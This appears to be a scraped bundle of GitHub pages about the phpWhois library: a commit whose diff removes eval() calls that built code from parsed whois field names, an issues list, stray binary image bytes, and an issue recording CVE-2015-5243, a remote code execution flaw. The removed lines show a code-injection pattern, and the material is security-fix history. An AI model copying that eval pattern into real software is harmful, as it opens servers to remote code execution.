
Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsparc%2FphpWhois.org%2Fcommit%2F5cc572490c9053d46598ec9348a11e36a5a33a46)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsparc%2FphpWhois.org%2Fcommit%2F5cc572490c9053d46598ec9348a11e36a5a33a46)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=sparc%2FphpWhois.org)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sparc](/sparc)
/
**[phpWhois.org](/sparc/phpWhois.org)**
Public

* [Notifications](/login?return_to=%2Fsparc%2FphpWhois.org) You must be signed in to change notification settings
* [Fork
  43](/login?return_to=%2Fsparc%2FphpWhois.org)
* [Star
   95](/login?return_to=%2Fsparc%2FphpWhois.org)

* [Code](/sparc/phpWhois.org)
* [Issues
  12](/sparc/phpWhois.org/issues)
* [Pull requests
  1](/sparc/phpWhois.org/pulls)
* [Actions](/sparc/phpWhois.org/actions)
* [Projects
  0](/sparc/phpWhois.org/projects)
* [Security](/sparc/phpWhois.org/security)
* [Insights](/sparc/phpWhois.org/pulse)

Additional navigation options

* [Code](/sparc/phpWhois.org)
* [Issues](/sparc/phpWhois.org/issues)
* [Pull requests](/sparc/phpWhois.org/pulls)
* [Actions](/sparc/phpWhois.org/actions)
* [Projects](/sparc/phpWhois.org/projects)
* [Security](/sparc/phpWhois.org/security)
* [Insights](/sparc/phpWhois.org/pulse)

## Commit

[Permalink](/sparc/phpWhois.org/commit/5cc572490c9053d46598ec9348a11e36a5a33a46)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

All eval's removed

[Browse files](/sparc/phpWhois.org/tree/5cc572490c9053d46598ec9348a11e36a5a33a46)
Browse the repository at this point in the history

* Loading branch information

sparc
committed
Sep 4, 2015

1 parent
[37f3f7a](/sparc/phpWhois.org/commit/37f3f7a60e3b6dd4a61c313f428986bb2be9cb56)

commit 5cc5724

Showing
**1 changed file**
with
**11 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

17 changes: 11 additions & 6 deletions

17
[whois.parser.php](#diff-9e75db3d062da63bd2e8ff21f2b515b6522343280d800cad777a17eaff4a5fa3 "whois.parser.php")

Show comments

[View file](/sparc/phpWhois.org/blob/5cc572490c9053d46598ec9348a11e36a5a33a46/whois.parser.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -109,7 +109,8 @@ function generic\_parser\_a\_blocks ($rawdata, $translate, &$disclaimer) |
|  |  | if ($k=='') continue; |
|  |  | if (strstr($k,'.')) |
|  |  | { |
|  |  | eval("\$block".getvarname($k)."=\$v;"); |
|  |  | $var = 'block'.getvarname($k); |
|  |  | $$var = $v; |
|  |  | continue; |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -446,9 +447,8 @@ function get\_blocks ( $rawdata, $items, $partial\_match = false, $def\_block = fal |
|  |  | } |
|  |  | else |
|  |  | { |
|  |  | $var = getvarname(strtok($field,'#')); |
|  |  | $itm = trim(substr($val,$pos+strlen($match))); |
|  |  | eval('$r'.$var.'=$itm;'); |
|  |  | $var = 'r'.getvarname(strtok($field,'#')); |
|  |  | $$var = trim(substr($val,$pos+strlen($match))); |
|  |  | } |
|  |  |  |
|  |  | break; |
| Expand Down  Expand Up | | @@ -518,7 +518,11 @@ function get\_blocks ( $rawdata, $items, $partial\_match = false, $def\_block = fal |
|  |  | if ($pos !== false) |
|  |  | { |
|  |  | $var = getvarname(strtok($field,'#')); |
|  |  | if ($var != '[]') eval('$r'.$var.'=$block;'); |
|  |  | if ($var != '[]') |
|  |  | { |
|  |  | $var = 'r'.$var; |
|  |  | $$var = $block; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -630,7 +634,8 @@ function get\_contact ( $array, $extra\_items='', $has\_org= false ) |
|  |  |  |
|  |  | if ($field != '' && $itm != '') |
|  |  | { |
|  |  | eval('$r'.getvarname($field).'=$itm;'); |
|  |  | $var = 'r'.getvarname($field); |
|  |  | $$var = $itm; |
|  |  | } |
|  |  |  |
|  |  | $val = trim(substr($val,0,$pos)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `5cc5724`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsparc%2FphpWhois.org%2Fcommit%2F5cc572490c9053d46598ec9348a11e36a5a33a46) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_14a69539_20250126_060222.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsmitty12%2FphpWhois%2Fissues%3Fq%3Ds)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

s

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsmitty12%2FphpWhois%2Fissues%3Fq%3Ds)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fissues%2Findex&source=header-repo&source_repo=jsmitty12%2FphpWhois)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jsmitty12](/jsmitty12)
/
**[phpWhois](/jsmitty12/phpWhois)**
Public

forked from [phpWhois/phpWhois](/phpWhois/phpWhois)

* [Notifications](/login?return_to=%2Fjsmitty12%2FphpWhois) You must be signed in to change notification settings
* [Fork
  20](/login?return_to=%2Fjsmitty12%2FphpWhois)
* [Star
   56](/login?return_to=%2Fjsmitty12%2FphpWhois)

* [Code](/jsmitty12/phpWhois)
* [Issues
  14](/jsmitty12/phpWhois/issues)
* [Pull requests
  6](/jsmitty12/phpWhois/pulls)
* [Actions](/jsmitty12/phpWhois/actions)
* [Projects
  0](/jsmitty12/phpWhois/projects)
* [Wiki](/jsmitty12/phpWhois/wiki)
* [Security](/jsmitty12/phpWhois/security)
* [Insights](/jsmitty12/phpWhois/pulse)

Additional navigation options

* [Code](/jsmitty12/phpWhois)
* [Issues](/jsmitty12/phpWhois/issues)
* [Pull requests](/jsmitty12/phpWhois/pulls)
* [Actions](/jsmitty12/phpWhois/actions)
* [Projects](/jsmitty12/phpWhois/projects)
* [Wiki](/jsmitty12/phpWhois/wiki)
* [Security](/jsmitty12/phpWhois/security)
* [Insights](/jsmitty12/phpWhois/pulse)

Preview
# Issues

Search IssuessSearch

[Labels](labels)[Milestones](milestones)[New issue](/login?return_to=)
## Search results

OpenClosedAuthorLabelsProjectsMilestonesAssigneesTypesSort

* ### [Does this fork support proxies? Or can it be modified to support proxies?](/jsmitty12/phpWhois/issues/90)

  Status: Open.#90 In jsmitty12/phpWhois;· [solkad](/jsmitty12/phpWhois/issues?q=s%20author%3Asolkad)  opened on Dec 27, 2021
* ### [Not getting detailed owner information](/jsmitty12/phpWhois/issues/83)

  Status: Closed (completed).#83 In jsmitty12/phpWhois;·  by [h888t](/jsmitty12/phpWhois/issues?q=s%20author%3Ah888t)  was closed on Jun 17, 2024
* ### [Support PHP 8.0](/jsmitty12/phpWhois/pull/80)

  Status: Merged (completed).jsmitty12/phpWhoisnumber 80 #80 In jsmitty12/phpWhois;·  by [jsmitty12](/jsmitty12/phpWhois/issues?q=s%20author%3Ajsmitty12)  was closed on Dec 6, 2020
* ### [[ErrorException] A non-numeric value encountered](/jsmitty12/phpWhois/issues/77)

  Status: Open.#77 In jsmitty12/phpWhois;· [alglyzin](/jsmitty12/phpWhois/issues?q=s%20author%3Aalglyzin)  opened on Nov 3, 2020
* ### [IPV6 results seem to all point to ::/0](/jsmitty12/phpWhois/issues/76)

  Status: Open.#76 In jsmitty12/phpWhois;· [blakethepatton](/jsmitty12/phpWhois/issues?q=s%20author%3Ablakethepatton)  opened on Oct 28, 2020
* ### [Fixed the fixture loading function for unit tests](/jsmitty12/phpWhois/pull/63)

  Status: Closed (abandoned).jsmitty12/phpWhoisnumber 63 #63 In jsmitty12/phpWhois;·  by [stollr](/jsmitty12/phpWhois/issues?q=s%20author%3Astollr)  was closed on Oct 3, 2020
* ### [Check array key, which is not always existing (in de\_handler)](/jsmitty12/phpWhois/pull/39)

  Status: Merged (completed).jsmitty12/phpWhoisnumber 39 #39 In jsmitty12/phpWhois;·  by [stollr](/jsmitty12/phpWhois/issues?q=s%20author%3Astollr)  was closed on Feb 19, 2019
* ### [Code cleanup](/jsmitty12/phpWhois/issues/33)

  Status: Open.#33 In jsmitty12/phpWhois;· [tomsommer](/jsmitty12/phpWhois/issues?q=s%20author%3Atomsommer)  opened on Sep 13, 2018 · [Version 6](https://github.com/jsmitty12/phpWhois/milestone/1)
* ### [Add support for .app domains](/jsmitty12/phpWhois/pull/27)

  Status: Merged (completed).jsmitty12/phpWhoisnumber 27 #27 In jsmitty12/phpWhois;·  by [fideloper](/jsmitty12/phpWhois/issues?q=s%20author%3Afideloper)  was closed on Jul 21, 2018
* ### [Adding this fork to Packagist](/jsmitty12/phpWhois/issues/10)

  Status: Closed (completed).#10 In jsmitty12/phpWhois;·  by [skylerkatz](/jsmitty12/phpWhois/issues?q=s%20author%3Askylerkatz)  was closed on Feb 4, 2018
* ### [uk whois not parsed correctly](/jsmitty12/phpWhois/pull/3)

  Status: Closed (abandoned).jsmitty12/phpWhoisnumber 3 #3 In jsmitty12/phpWhois;·  by [adamjimenez](/jsmitty12/phpWhois/issues?q=s%20author%3Aadamjimenez)  was closed on Jan 18, 2018
* ### [not getting expiration date](/jsmitty12/phpWhois/pull/1)

  Status: Merged (completed).jsmitty12/phpWhoisnumber 1 #1 In jsmitty12/phpWhois;·  by [adamjimenez](/jsmitty12/phpWhois/issues?q=s%20author%3Aadamjimenez)  was closed on Jan 15, 2018

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avatars.githubusercontent.com_292ac335_20250126_060215.html ===
���� JFIF  ` `  �� ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
�� C 



�� C  

��  @ @" ��           
�� �   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        
�� �  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �� ���C�������+�ϊZ���/Xh#g��lG��d\.=Nk��
��������0���^&�i��[
X�-�V�6׾C1\_0�ӷ#���� �KVPZ�o���\aW
N3z+~G�� ����m
R4�\_�S�� 9ӐW�J�ѾͮOZLsk24x�Ɔ�N��>a���N�:�G.��yד���'��y�\_q|-�e��v0[[�k�3c�q�&��)4�g�F�e9$�>U���i�Ɯ.��c�#
��C��k��fTpp���u.Q\_>T����\_H����#,r!��=r�\*�$��D�q�<��A����驦i�Ď
,�v�L~�}�P�
�Λ�^]Z���պͧ�.$�<�feN�  �q�\���������r葃��A�]��s�"�>�!G9������K{����5HaE
e���+�x�`�������K��820J��'W\�Vÿ�+\Ζa�ūњ��~�bb��.m޳� A���<�,��5�{�j�w�mE�����2�8h�X�l`����Ez������exg��d$P���>-|H��~�yq�E�I.a^
��9�:}j&���FsZC����>#\_Z�zdZ��� |��;X/ H���5��gg���?ٖ��P�g�;f��HX̥1f��~9
 �?�}�K��n�^գ��˛d$�9��꣑���a����;N�4��6e�p?��w?�}�������4�@���0��=��2|�j{Z��3ḗ5�̡�z3�ގ��x^���D��`� G"��½'�6F��� Ls���[��<ӳ�Wl|� �7G��ZJ�F�D������3�����Uct~����c7~׿���W\�9�� ��a�� hX�B�؉�;W��� Ԥ���y��b��Y���8k��V���"� �]�\_ݹxzQ\_>�� 
�����5��)W��d�d
���^x��|��<� ��橇�:Z����ב���1�)�e�;������������ %���K6%i�����3���CP�g�����YPʈ�aPY���+�� x�1�\_�\*�$+} ]����m����Zk�Z��pN�k���NO�W��]%�E��� \_��mL% �5��~'��

=== Content from github.com_1fda535c_20250125_044245.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsmitty12%2FphpWhois%2Fissues%2F19)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjsmitty12%2FphpWhois%2Fissues%2F19)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=jsmitty12%2FphpWhois)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jsmitty12](/jsmitty12)
/
**[phpWhois](/jsmitty12/phpWhois)**
Public

forked from [phpWhois/phpWhois](/phpWhois/phpWhois)

* [Notifications](/login?return_to=%2Fjsmitty12%2FphpWhois) You must be signed in to change notification settings
* [Fork
  20](/login?return_to=%2Fjsmitty12%2FphpWhois)
* [Star
   56](/login?return_to=%2Fjsmitty12%2FphpWhois)

* [Code](/jsmitty12/phpWhois)
* [Issues
  14](/jsmitty12/phpWhois/issues)
* [Pull requests
  6](/jsmitty12/phpWhois/pulls)
* [Actions](/jsmitty12/phpWhois/actions)
* [Projects
  0](/jsmitty12/phpWhois/projects)
* [Wiki](/jsmitty12/phpWhois/wiki)
* [Security](/jsmitty12/phpWhois/security)
* [Insights](/jsmitty12/phpWhois/pulse)

Additional navigation options

* [Code](/jsmitty12/phpWhois)
* [Issues](/jsmitty12/phpWhois/issues)
* [Pull requests](/jsmitty12/phpWhois/pulls)
* [Actions](/jsmitty12/phpWhois/actions)
* [Projects](/jsmitty12/phpWhois/projects)
* [Wiki](/jsmitty12/phpWhois/wiki)
* [Security](/jsmitty12/phpWhois/security)
* [Insights](/jsmitty12/phpWhois/pulse)

# CVE-2015-5243: Remote Code Execution #19

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[CVE-2015-5243: Remote Code Execution](#top)#19Copy linkAssignees [![jsmitty12](https://avatars.githubusercontent.com/u/149391?s=64&v=4)](/jsmitty12)Labels[security](https://github.com/jsmitty12/phpWhois/issues?q=state%3Aopen%20label%3A%22security%22)[![@jsmitty12](https://avatars.githubusercontent.com/u/149391?v=4&size=80)](/jsmitty12)
## Description

[![@jsmitty12](https://avatars.githubusercontent.com/u/149391?v=4&size=48)](/jsmitty12)[jsmitty12](https://github.com/jsmitty12)opened [on May 25, 2018](https://github.com/jsmitty12/phpWhois/issues/19#issue-326610193)

Reported by David Gnedt ([SBA Research](https://www.sba-research.org/))

Documentation: <https://blog.nettitude.com/uk/cve-2015-5243-phpwhois-remote-code-execution>

## Metadata

### Assignees

* [![@jsmitty12](https://avatars.githubusercontent.com/u/149391?s=64&v=4)jsmitty12](/jsmitty12)
### Labels

[security](https://github.com/jsmitty12/phpWhois/issues?q=state%3Aopen%20label%3A%22security%22)
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


